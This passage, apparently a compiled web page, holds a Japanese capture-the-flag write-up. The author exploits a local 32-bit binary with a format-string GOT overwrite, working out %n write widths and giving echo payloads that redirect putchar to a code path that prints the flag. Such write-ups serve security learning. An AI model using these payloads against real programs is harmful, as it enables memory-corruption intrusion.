AAAA,0x400,0x9258c0,0x8,0x14,0xc84fc4,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025\n")])])]),s("ul",[s("li",[t._v("format stringで行けそう!")]),t._v(" "),s("li",[t._v("引数は6個目")]),t._v(" "),s("li",[t._v("6個目にsystem関数の実行番地を仕込んで実行すれば"),s("code",[t._v("/bin/sh")]),t._v("を実行できるか?")]),t._v(" "),s("li",[t._v("できなさそう(system関数の番地がわからない)")]),t._v(" "),s("li",[t._v("使えそうな関数を探す")]),t._v(" "),s("li")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("q4@localhost ~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("$ objdump -d -M intel -j .plt ./q4 \n\n./q4:     "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("file")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("format")]),t._v(" elf32-i386\n\n\nDisassembly of section .plt:\n\n08048454 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("__gmon_start__@plt-0x1"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v(":\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048454")]),t._v(":       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("35")]),t._v(" d4 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       push   DWORD PTR ds:0x80499d4\n804845a:       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("25")]),t._v(" d8 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       jmp    DWORD PTR ds:0x80499d8\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048460")]),t._v(":       00 00                   "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("add")]),t._v("    BYTE PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("eax"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",al\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\n\n08048464 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("__gmon_start__@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048464")]),t._v(":       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("25")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("dc")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       jmp    DWORD PTR ds:0x80499dc\n804846a:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" 00 00 00 00          push   0x0\n804846f:       e9 e0 ff ff ff          jmp    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048454")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_init+0x3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v("\n\n08048474 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("putchar@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048474")]),t._v(":       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("25")]),t._v(" e0 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       jmp    DWORD PTR ds:0x80499e0\n804847a:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" 08 00 00 00          push   0x8\n804847f:       e9 d0 ff ff ff          jmp    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048454")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_init+0x3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v("\n\n08048484 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("fgets@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048484")]),t._v(":       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("25")]),t._v(" e4 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       jmp    DWORD PTR ds:0x80499e4\n804848a:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10")]),t._v(" 00 00 00          push   0x10\n804848f:       e9 c0 ff ff ff          jmp    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048454")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_init+0x3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v("\n\n08048494 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("__libc_start_main@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048494")]),t._v(":       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("25")]),t._v(" e8 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       jmp    DWORD PTR ds:0x80499e8\n804849a:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" 00 00 00          push   0x18\n804849f:       e9 b0 ff ff ff          jmp    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048454")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_init+0x3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v("\n\n080484a4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("fopen@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n80484a4:       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("25")]),t._v(" ec "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       jmp    DWORD PTR ds:0x80499ec\n80484aa:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v(" 00 00 00          push   0x20\n80484af:       e9 a0 ff ff ff          jmp    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048454")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_init+0x3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v("\n\n080484b4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("printf@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n80484b4:       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("25")]),t._v(" f0 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       jmp    DWORD PTR ds:0x80499f0\n80484ba:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("28")]),t._v(" 00 00 00          push   0x28\n80484bf:       e9 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("90")]),t._v(" ff ff ff          jmp    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048454")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_init+0x3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v("\n\n080484c4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("puts@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n80484c4:       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("25")]),t._v(" f4 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       jmp    DWORD PTR ds:0x80499f4\n80484ca:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("30")]),t._v(" 00 00 00          push   0x30\n80484cf:       e9 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v(" ff ff ff          jmp    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048454")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_init+0x3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v("\n\n080484d4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("__gxx_personality_v0@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n80484d4:       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("25")]),t._v(" f8 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       jmp    DWORD PTR ds:0x80499f8\n80484da:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("38")]),t._v(" 00 00 00          push   0x38\n80484df:       e9 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("70")]),t._v(" ff ff ff          jmp    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048454")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_init+0x3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v("\n\n080484e4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("strcmp@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n80484e4:       ff "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("25")]),t._v(" fc "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),t._v(" 04 08       jmp    DWORD PTR ds:0x80499fc\n80484ea:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00          push   0x40\n80484ef:       e9 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("60")]),t._v(" ff ff ff          jmp    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048454")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_init+0x3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),t._v("\n")])])]),s("ul",[s("li",[t._v("fopen関数が使えるのでは?")]),t._v(" "),s("li",[t._v("先ほどのmain関数を見返してみると, fopenしてくれている部分がある")]),t._v(" "),s("li",[t._v("このfopenをprintfとかputsとかから参照してやれば良さそう?")]),t._v(" "),s("li",[t._v("fgetsで入力文字列の上書きをするので, fgetsの後のprintfをcallする関数を上書きしてみる")])]),t._v(" "),s("h2",{attrs:{id:"攻撃のまとめ"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#攻撃のまとめ"}},[t._v("#")]),t._v(" 攻撃のまとめ")]),t._v(" "),s("ul",[s("li",[t._v("fopen関数の番地は, "),s("code",[t._v("0x080484a4")])]),t._v(" "),s("li",[t._v("printf関数の番地は, "),s("code",[t._v("0x080484b4")])]),t._v(" "),s("li",[t._v("printf関数内で呼び出しているのは, "),s("code",[t._v("0x080499f0")]),t._v("なので, これを"),s("code",[t._v("0x080486a0")]),t._v("に上書きする")])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",{staticStyle:{"text-align":"center"}},[t._v("入力アドレス")]),t._v(" "),s("th",{staticStyle:{"text-align":"center"}},[t._v("出力バイト数")]),t._v(" "),s("th",{staticStyle:{"text-align":"center"}},[t._v("総出力バイト数")]),t._v(" "),s("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),s("tbody",[s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("0x080499f0")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("4バイトずつ攻撃")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("0x080499f2")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("8")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("''")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("%39400x")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("39400")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("39408")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("39408(0x99f0)-8=39400")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("%6$n")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("39408")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("引数は6個目から")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("%28180x")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("28180")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("67588")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("67588(0x0804)-39408=28180")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("%7$n")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("67588")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("次は7個目")])])])]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" -e "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\xf0\\x99\\x04\\x08\\xf2\\x99\\x04\\x08%39400x%6$hn%28180x%7$hn'")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./q4\n")])])]),s("ul",[s("li",[t._v("通らない")]),t._v(" "),s("li",[t._v("printf(0x80499f0)の代わりにputchar(0x80499e0)を使ってみる")])]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("q4@localhost ~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("$ "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" -e "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\xe0\\x99\\x04\\x08\\xe2\\x99\\x04\\x08%39400x%6$hn%28180x%7$hn'")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./q4\n~~ 略 ~~~\nSegmentation Fault\n~~ 略 ~~~\n")])])]),s("ul",[s("li",[t._v("gdbで原因を探る")])]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("q4@localhost ~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("$ "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" -e "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'r\\n\\xe0\\x99\\x04\\x08\\xe2\\x99\\x04\\x08%39400x%6$hn%28180x%7$hn'")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" gdb -q ./q4\nReading symbols from /home/q4/q4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v("."),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("no debugging symbols found"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".done.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gdb"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Hangup detected on fd "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\nerror detected on stdin\n")])])]),s("ul",[s("li",[t._v("パイプでバグって正しい結果が出力できていないらしい\n"),s("ul",[s("li",[t._v("ref. https://stackoverflow.com/questions/8121823/gdb-pipe-redirection-error-gdb-hangup-detected-on-fd-0")])])]),t._v(" "),s("li",[t._v("引数ではなく, 呼び出す番地が正しくないという仮説をたててみる")]),t._v(" "),s("li",[t._v("fopenを直接呼ぶのではなく, その少し前を呼ぶのはどう?")]),t._v(" "),s("li",[t._v("jne命令がある(0x0804868f)ので, その後(0x08048691)からなら呼べそう")]),t._v(" "),s("li",[t._v("まとめると次のような感じ")])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",{staticStyle:{"text-align":"center"}},[t._v("入力アドレス")]),t._v(" "),s("th",{staticStyle:{"text-align":"center"}},[t._v("出力バイト数")]),t._v(" "),s("th",{staticStyle:{"text-align":"center"}},[t._v("総出力バイト数")]),t._v(" "),s("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),s("tbody",[s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("0x080499f0")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("4バイトずつ攻撃")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("0x080499f2")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("8")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("''")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("%34441x")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("34441")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("34449")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("34449(0x8691)-8=34441")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("%6$n")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("34449")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("引数は6個目から")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("%33139x")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("33139")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("67588")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("67588(0x10804)-34449=33139")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("%7$n")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("67588")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("次は7個目")])])])]),t._v(" "),s("ul",[s("li",[t._v("コマンドは次の通り")])]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" -e "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\xf0\\x99\\x04\\x08\\xf2\\x99\\x04\\x08%34441x%6$hn%33139x%7$hn'")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./q4\n~~ 略 ~~~\nDo you want the flag?\n")])])]),s("ul",[s("li",[t._v("通らない...")]),t._v(" "),s("li",[t._v("一応putcharも試す")])]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" -e "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\xe0\\x99\\x04\\x08\\xe2\\x99\\x04\\x08%34441x%6$hn%33139x%7$hn'")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./q4\n~~ 略 ~~~\nFLAG_~~~ 略 ~~~\n")])])]),s("ul",[s("li",[t._v("通った!!!!!!!")])]),t._v(" "),s("h1",{attrs:{id:"感想"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#感想"}},[t._v("#")]),t._v(" 感想")]),t._v(" "),s("ul",[s("li",[t._v("通せたのは嬉しい")]),t._v(" "),s("li",[t._v("printfは何故に通らなかったの?")]),t._v(" "),s("li",[t._v("ハリネズミ本を見返したら, 正しくはformat string attackではなく, got overwriteだったらしい")])])])}),[],!1,null,null,null);s.default=n.exports}}]);